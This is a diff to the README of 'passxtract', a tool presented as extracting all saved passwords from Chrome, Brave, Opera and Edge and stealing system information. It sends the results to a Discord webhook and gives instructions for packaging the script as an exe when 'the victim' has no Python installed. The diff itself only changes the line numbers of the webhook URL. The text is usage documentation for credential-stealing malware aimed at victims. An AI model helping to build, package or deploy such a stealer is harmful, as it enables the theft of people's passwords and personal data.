@@ -1,7 +1,7 @@
 passxtract, extracts all passwords in the browsers: Google Chrome, Brave, Opera & Microsoft Edge
 also steals some system info
 
-results would be sent to discord webhook(edit the webhook url at line:36)
+results would be sent to discord webhook(edit the webhook url at line:35-36)
 
 if the victim does not have python installed convert main.py into exe steps are here:
 
